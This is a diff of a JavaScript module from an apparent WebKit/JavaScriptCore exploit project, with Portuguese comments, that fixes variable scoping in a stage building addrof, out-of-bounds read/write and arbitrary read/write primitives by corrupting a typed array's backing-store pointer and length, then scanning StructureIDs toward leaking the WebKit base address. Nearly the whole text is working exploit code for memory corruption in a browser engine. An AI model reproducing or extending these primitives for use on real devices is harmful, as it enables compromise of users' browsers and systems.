@@ -1,8 +1,8 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v118 - R78 Correção de Typos e Pequenos Ajustes)
+// js/script3/testArrayBufferVictimCrash.mjs (v119 - R79 Correção de Escopo de Variáveis)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// - Correção do typo "arb_rw_array_ab_ab_view_addr" para "arb_rw_array_ab_view_addr".
-// - Pequenos ajustes nos logs para maior clareza.
+// - Ajusta o escopo das variáveis chave (leak_target_obj, leak_target_addr) para que
+//   elas sejam acessíveis por todas as fases relevantes dentro do bloco 'try'.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -16,7 +16,7 @@ import {
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // Nome do módulo atualizado para refletir a nova tentativa de correção
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v118_R78_FixTypo";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v119_R79_ScopeFix";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -40,7 +40,7 @@ function doubleToInt64(double) {
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Corrupção de Backing Store (Typos Corrigidos) ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Corrupção de Backing Store (Escopo Corrigido) ---`, "test");
 
     let final_result = {
         success: false,
@@ -60,6 +60,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     // As funções de leitura/escrita arbitrária para a Fase 5 e em diante
     let arb_read_stable = null;
     let arb_write_stable = null;
+
+    // Variáveis com escopo ajustado para serem acessíveis em toda a função
+    let leak_target_obj = null;
+    let leak_target_addr = null;
 
     try {
         // Helper para definir as primitivas de addrof/fakeobj (para obtenção de endereços)
@@ -129,7 +133,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         // --- Reiniciar TODO o ambiente para a Fase 5 ---
         logS3("--- PREPARANDO FASE 5: RE-INICIALIZANDO TODO O AMBIENTE OOB E PRIMITIVAS... ---", "critical");
         
-        // Zera as referências antigas para ajudar na coleta de lixo
         confused_array = null;
         victim_array = null;
         addrof_func = null;
@@ -162,6 +165,14 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         arb_rw_array = new Uint8Array(0x1000); 
         logS3(`    arb_rw_array criado. Endereço interno será corrompido.`, "info");
 
+        // Agora, 'leak_target_obj' e 'leak_target_addr' são inicializados aqui, após o OOB re-trigger.
+        leak_target_obj = { f: 0xDEADBEEF, g: 0xCAFEBABE, h: 0x11223344 }; 
+        for(let i=0; i<1000; i++) { leak_target_obj[`p${i}`] = i; } 
+        leak_target_addr = addrof_func(leak_target_obj); // Atribui à variável de escopo mais amplo
+        logS3(`[Etapa 1] Endereço do objeto alvo (leak_target_obj): ${leak_target_addr.toString(true)}`, "info");
+        
+        await PAUSE_S3(250); // Pausa após obtenção do endereço
+
         const arb_rw_array_ab_view_addr = addrof_func(arb_rw_array);
         logS3(`    Endereço do ArrayBufferView de arb_rw_array: ${arb_rw_array_ab_view_addr.toString(true)}`, "leak");
 
@@ -169,7 +180,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         if (!oob_dv) throw new Error("DataView OOB não está disponível após re-inicialização.");
 
         const arb_rw_array_m_vector_orig_ptr_addr = arb_rw_array_ab_view_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
-        // CORREÇÃO: Typo aqui! Era arb_rw_array_ab_ab_view_addr
         const arb_rw_array_m_length_orig_ptr_addr = arb_rw_array_ab_view_addr.add(JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET); 
         
         const original_m_vector = oob_read_absolute(arb_rw_array_m_vector_orig_ptr_addr, 8);
@@ -180,11 +190,11 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         arb_read_stable = (address, size_bytes) => {
             oob_write_absolute(arb_rw_array_m_vector_orig_ptr_addr, address, 8);
-            oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, 0xFFFFFFFF, 4); // Max length
+            oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, 0xFFFFFFFF, 4); 
 
             let result;
-            const dv = new DataView(arb_rw_array.buffer); // Usar DataView no buffer corruptível
-            if (size_bytes === 1) result = arb_rw_array[0]; // Uint8Array pode ler byte a byte
+            const dv = new DataView(arb_rw_array.buffer); 
+            if (size_bytes === 1) result = arb_rw_array[0]; 
             else if (size_bytes === 2) result = dv.getUint16(0, true);
             else if (size_bytes === 4) result = dv.getUint32(0, true);
             else if (size_bytes === 8) result = doubleToInt64(dv.getFloat64(0, true));
@@ -197,9 +207,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
 
         arb_write_stable = (address, value, size_bytes) => {
             oob_write_absolute(arb_rw_array_m_vector_orig_ptr_addr, address, 8);
-            oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, 0xFFFFFFFF, 4); // Max length
+            oob_write_absolute(arb_rw_array_m_length_orig_ptr_addr, 0xFFFFFFFF, 4); 
 
-            const dv = new DataView(arb_rw_array.buffer); // Usar DataView no buffer corruptível
+            const dv = new DataView(arb_rw_array.buffer); 
             if (size_bytes === 1) arb_rw_array[0] = value;
             else if (size_bytes === 2) dv.setUint16(0, value, true);
             else if (size_bytes === 4) dv.setUint32(0, value, true);
@@ -300,9 +310,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             actual_structure_id = found_structure_id;
             logS3(`[DECISÃO] Usando StructureID encontrado pelo scanner em ${toHex(JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET)}: ${toHex(actual_structure_id)}`, "info");
             
-            // Para resolver o ponteiro da Structure, precisamos do webkit_base_addr e STRUCTURE_TABLE_OFFSET_FROM_WEBKIT_BASE.
-            // A lógica de vazamento completo da WebKit será ajustada depois de termos
-            // certeza sobre a leitura do StructureID/Pointer.
             final_result.message = `StructureID ${toHex(actual_structure_id)} encontrado. Precisamos do WebKit Base Address e da Structure Table Base para resolver o ponteiro da Structure.`;
             final_result.success = true; 
             final_result.webkit_leak_result = { success: false, msg: final_result.message, webkit_base_candidate: null };
